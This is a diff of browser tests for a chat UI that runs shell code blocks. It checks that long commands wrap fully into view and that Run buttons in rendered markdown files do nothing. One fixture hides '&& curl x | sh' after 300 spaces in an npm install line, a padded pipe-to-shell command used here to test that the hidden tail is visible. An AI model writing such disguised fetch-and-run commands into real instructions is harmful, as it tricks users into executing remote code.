@@ -10,11 +10,16 @@ import { findChromium, launch, notFound } from './browser.mjs';
 import { as, cliCalls, PASSWORD, request, signIn, start, until } from './harness.mjs';
 
 const ID = 'one';
+const DOCS = 'docs';
 const REPLY = [
   'Two to try, and one with a hidden character.',
   '```bash\necho from the block\n```',
   '```\necho hid​den\n```',
 ].join('\n\n');
+
+const WIDE = `npm install${' '.repeat(300)}&& curl x | sh`;
+const DOCS_REPLY = ['The setup is in [the README](~/README.md).', `\`\`\`bash\n${WIDE}\n\`\`\``, `\`\`\`python\n${WIDE}\n\`\`\``].join('\n\n');
+const README = '# Setup\n\n```bash\necho from the readme\n```\n';
 
 const chromium = findChromium();
 const skip = chromium ? false : notFound();
@@ -52,9 +57,12 @@ function withoutTerminal(target) {
 
 before(async () => {
   if (skip) return;
-  app = await start({ sessions: [{ id: ID, title: 'One' }], claude: true });
-  const transcript = path.join(app.home, '.claude', 'projects', '-test-folder', `${ID}.jsonl`);
-  fs.appendFileSync(transcript, `${JSON.stringify({ type: 'assistant', timestamp: '2026-10-16T01:00:02.000Z', message: { id: 'msg_1', role: 'assistant', content: [{ type: 'text', text: REPLY }] } })}\n`);
+  app = await start({ sessions: [{ id: ID, title: 'One' }, { id: DOCS, title: 'Docs' }], claude: true });
+  const reply = (id, text) => fs.appendFileSync(path.join(app.home, '.claude', 'projects', '-test-folder', `${id}.jsonl`),
+    `${JSON.stringify({ type: 'assistant', timestamp: '2026-10-16T01:00:02.000Z', message: { id: 'msg_1', role: 'assistant', content: [{ type: 'text', text }] } })}\n`);
+  reply(ID, REPLY);
+  reply(DOCS, DOCS_REPLY);
+  fs.writeFileSync(path.join(app.home, 'README.md'), README);
   ({ token } = await signIn(app));
   older = await withoutTerminal(app);
   browser = await launch(chromium);
@@ -65,10 +73,10 @@ after(async () => {
   await older?.close();
 });
 
-const runs = async () => (await request(app, 'GET', `/api/sessions/${ID}/terminal`, { headers: as(token) })).body().runs;
+const runs = async (id = ID) => (await request(app, 'GET', `/api/sessions/${id}/terminal`, { headers: as(token) })).body().runs;
 
-// A page signed in through the login page of the server at `origin`, on the chat.
-async function chatPage(t, origin = app.origin) {
+// A page signed in through the login page of the server at `origin`, on the chat `id`, once its `blocks` code blocks are drawn.
+async function chatPage(t, origin = app.origin, { id = ID, blocks = 2 } = {}) {
   const page = await browser.open(`${origin}/`);
   t.after(() => page.close());
   await page.until(`document.readyState === 'complete' && (!!document.querySelector('#password') || !!document.querySelector('.list-foot'))`);
@@ -81,8 +89,8 @@ async function chatPage(t, origin = app.origin) {
       await page.until(`!document.querySelector('.offer')`);
     }
   }
-  await page.evaluate(`localStorage.removeItem('capcom.panels'); location.hash = '#/s/${ID}'`);
-  await page.until(`document.querySelectorAll('.code-block').length === 2`, 15_000);
+  await page.evaluate(`localStorage.removeItem('capcom.panels'); location.hash = '#/s/${id}'`);
+  await page.until(`document.querySelectorAll('.code-block').length === ${blocks}`, 15_000);
   return page;
 }
 
@@ -146,5 +154,37 @@ test('a page next to a server that does not say it has a terminal shows no Run, 
   await type(page, '!echo not a command');
   assert.equal(await page.evaluate(`document.getElementById('composer').hasAttribute('data-bang') || !!document.getElementById('bang-hint')`), false);
   assert.equal(await page.evaluate(`document.getElementById('send').getAttribute('aria-label')`), 'Send');
+  assert.deepEqual(page.problems, []);
+});
+
+test('a block that has Run wraps its long lines so the whole command is in view, and a block without Run still scrolls sideways', { skip, timeout }, async t => {
+  const page = await chatPage(t, app.origin, { id: DOCS, blocks: 2 });
+  const [shell, other] = await page.evaluate(`[...document.querySelectorAll('pre.code')].map(pre => {
+    const text = [...pre.querySelectorAll('code')].at(-1).firstChild;
+    const end = document.createRange();
+    end.setStart(text, text.length - 1);
+    end.setEnd(text, text.length);
+    return { wrap: getComputedStyle(pre).whiteSpace, sideways: pre.scrollWidth - pre.clientWidth, endsAt: end.getBoundingClientRect().right, edge: pre.getBoundingClientRect().right };
+  })`);
+  assert.equal(shell.wrap, 'pre-wrap');
+  assert.ok(shell.sideways <= 0, `the shell block scrolls sideways by ${shell.sideways}px`);
+  assert.ok(shell.endsAt <= shell.edge, 'the end of the command is inside the block');
+  assert.equal(other.wrap, 'pre');
+  assert.ok(other.sideways > 0, 'a block with no Run keeps scrolling');
+  assert.deepEqual(page.problems, []);
+});
+
+test('a markdown file in the File tab has Copy on its code blocks and no Run, and a Run button forced into view still runs nothing', { skip, timeout }, async t => {
+  const page = await chatPage(t, app.origin, { id: DOCS, blocks: 2 });
+  await page.click('a.file-link');
+  await page.until(`!!document.querySelector('#panel .file-doc .code-block')`, 15_000);
+  assert.equal(await page.evaluate(visible('[data-code=copy]', '.file-doc')), 1);
+  assert.equal(await page.evaluate(visible('[data-code=run]', '.file-doc')), 0);
+  assert.equal(await page.evaluate(visible('[data-code=run]', '.items')), 1, 'the reply beside it keeps its Run');
+  await page.evaluate(`document.head.append(Object.assign(document.createElement('style'), { textContent: '.file-doc [data-code=run] { display: inline-flex !important }' }))`);
+  assert.equal(await page.evaluate(visible('[data-code=run]', '.file-doc')), 1);
+  await page.click('.file-doc [data-code=run]');
+  await new Promise(resolve => setTimeout(resolve, 400));
+  assert.deepEqual(await runs(DOCS), []);
   assert.deepEqual(page.problems, []);
 });
